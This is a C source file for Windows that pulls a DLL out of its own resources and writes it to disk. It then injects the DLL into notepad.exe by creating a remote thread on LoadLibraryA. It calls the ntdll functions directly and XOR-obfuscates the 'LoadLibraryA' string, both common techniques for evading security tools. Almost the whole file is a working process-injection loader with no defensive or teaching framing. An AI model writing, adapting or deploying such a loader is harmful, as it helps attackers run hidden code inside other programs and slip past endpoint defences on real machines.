#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#include <winnt.h>
#include "injection.h"
#define IDR_DLL2 102

const char key = 0x5A;

char obfStr[] = {
    'L' ^ key, 'o' ^ key, 'a' ^ key, 'd' ^ key,
    'L' ^ key, 'i' ^ key, 'b' ^ key, 'r' ^ key,
    'a' ^ key, 'r' ^ key, 'y' ^ key, 'A' ^ key, 0
};

void deobfuscate(char* str, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

FARPROC ResolveLoadLibraryA() {
    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32Base)
        return NULL;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return NULL;

    LdrGetProcedureAddress_t LdrGetProcedureAddress =
        (LdrGetProcedureAddress_t)GetNtFunctionAddress("LdrGetProcedureAddress", ntdll);

    if (!LdrGetProcedureAddress)
        return NULL;

    deobfuscate(obfStr, sizeof(obfStr) - 1);
    ANSI_STRING funcName;
    funcName.Buffer = obfStr;
    funcName.Length = (USHORT)(sizeof(obfStr) - 1);
    funcName.MaximumLength = funcName.Length + 1;

    FARPROC funcAddr = NULL;
    if (!NT_SUCCESS(LdrGetProcedureAddress(kernel32Base, &funcName, 0, (PVOID*)&funcAddr)))
        return NULL;

    deobfuscate(obfStr, sizeof(obfStr) - 1);

    return funcAddr;
}

void ExtractEmbeddedDLL() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), RT_RCDATA);
    if (hRes == NULL) {
        printf("Failed to find DLL resource.\n");
        return;
    }

    DWORD dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) {
        printf("Failed to get size of DLL resource.\n");
        return;
    }

    HGLOBAL hGlobal = LoadResource(NULL, hRes);
    if (hGlobal == NULL) {
        printf("Failed to load DLL resource.\n");
        return;
    }

    void* pData = LockResource(hGlobal);
    if (pData == NULL) {
        printf("Failed to lock resource.\n");
        return;
    }

    FILE* file = NULL;
    errno_t err = fopen_s(&file, "extracted.dll", "wb");
    if (err != 0) {
        printf("Failed to create output file.\n");
        return;
    }

    fwrite(pData, 1, dwSize, file);
    fclose(file);
    printf("DLL extracted to 'extracted.dll'\n");
}

DWORD GetProcessIdNative(const wchar_t* targetProcessName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetNtFunctionAddress("NtQuerySystemInformation", ntdll);
    if (!NtQuerySystemInformation) return 0;

    ULONG bufferSize = 0x10000; // 64 KB initial buffer
    PVOID buffer = NULL;
    NTSTATUS status;
    DWORD pid = 0;

    do {
        PVOID newBuffer = realloc(buffer, bufferSize);
        if (!newBuffer) {
            free(buffer);
            return 0;
        }
        buffer = newBuffer;
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        free(buffer);
        return 0;
    }

    ULONG offset = 0;
    while (true) {
        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)buffer + offset);

        if (spi->ImageName.Buffer) {
            if (_wcsicmp(spi->ImageName.Buffer, targetProcessName) == 0) {
                pid = (DWORD)(ULONG_PTR)spi->ProcessId;
                break;
            }
        }

        if (spi->NextEntryOffset == 0)
            break;
        offset += spi->NextEntryOffset;
    }

    free(buffer);
    return pid;
}

void InjectDLL(const wchar_t* targetName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    xd_NtOpenProcess NtOpenProcess = (xd_NtOpenProcess)GetNtFunctionAddress("NtOpenProcess", ntdll);
    xd_NtAllocateVirtualMemory NtAllocateVirtualMemory = (xd_NtAllocateVirtualMemory)GetNtFunctionAddress("NtAllocateVirtualMemory", ntdll);
    xd_NtWriteVirtualMemory NtWriteVirtualMemory = (xd_NtWriteVirtualMemory)GetNtFunctionAddress("NtWriteVirtualMemory", ntdll);
    xd_NtProtectVirtualMemory NtProtectVirtualMemory = (xd_NtProtectVirtualMemory)GetNtFunctionAddress("NtProtectVirtualMemory", ntdll);
    xd_NtCreateThreadEx NtCreateThreadEx = (xd_NtCreateThreadEx)GetNtFunctionAddress("NtCreateThreadEx", ntdll);
    xd_NtWaitForSingleObject NtWaitForSingleObject = (xd_NtWaitForSingleObject)GetNtFunctionAddress("NtWaitForSingleObject", ntdll);
    xd_NtFreeVirtualMemory NtFreeVirtualMemory = (xd_NtFreeVirtualMemory)GetNtFunctionAddress("NtFreeVirtualMemory", ntdll);
    xd_NtClose NtClose = (xd_NtClose)GetNtFunctionAddress("NtClose", ntdll);

    DWORD pid = GetProcessIdNative(targetName);
    if (pid == 0) {
        printf("Failed to get PID of target process.\n");
        return;
    }

    OBJECT_ATTRIBUTES objAttr = { 0 };
    CLIENT_ID clientId = { 0 };
    HANDLE hProcess = NULL;
    DWORD OldProtection = 0;
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    clientId.UniqueThread = 0;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    printf("a");
    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, &objAttr, &clientId);
    if (status != STATUS_SUCCESS || hProcess == NULL) {
        PRINTXD("NtOpenProcess", status);
        return;     }


    printf("b");
    SIZE_T dllPathSize = strlen("extracted.dll") + 1;
    LPVOID pRemoteMem = NULL;
    SIZE_T regionSize = dllPathSize;
    status = NtAllocateVirtualMemory(hProcess, &pRemoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        PRINTXD("NtAllocateVirtualMemory", status);
        NtClose(hProcess);
        return;    }


    printf("b");
    char fullDllPath[MAX_PATH];
    if (GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPath, NULL) == 0) {
        printf("Failed to get full DLL path. Error: %lu\n", GetLastError());
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;    }


    printf("c");
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, pRemoteMem, fullDllPath, strlen(fullDllPath) + 1, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        PRINTXD("NtWriteVirtualMemory", status);
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;    }


    DWORD oldProtect = 0;
    status = NtProtectVirtualMemory(hProcess, &pRemoteMem, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
        PRINTXD("NtProtectVirtualMemory", status);
    }

    /*printf("d");
    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32Base) {
        printf("Failed to get kernel32.dll handle: %lu\n", GetLastError());
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;     }
        */

    printf("e");
    FARPROC loadLibraryAddr = ResolveLoadLibraryA();
    if (!loadLibraryAddr) {
        printf("Failed to get LoadLibraryA address: %lu\n", GetLastError());
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;     }


    printf("f");
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, 
        (LPTHREAD_START_ROUTINE)loadLibraryAddr, pRemoteMem, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || hThread == NULL) {
        PRINTXD("NtCreateThreadEx", status);
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;     }
    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!NT_SUCCESS(status)) {
        PRINTXD("NtWaitForSingleObject", status);
        NtClose(hThread);
        NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;     }
   

    printf("g");
    NtClose(hThread);
    status = NtFreeVirtualMemory(hProcess, &pRemoteMem, &regionSize, MEM_RELEASE);
    if (!NT_SUCCESS(status)) {
        PRINTXD("NtFreeVirtualMemory", status);     }
    NtClose(hProcess);
}

int main() {
    ExtractEmbeddedDLL();
    InjectDLL(L"notepad.exe");
    printf(" done");
    return 0;
}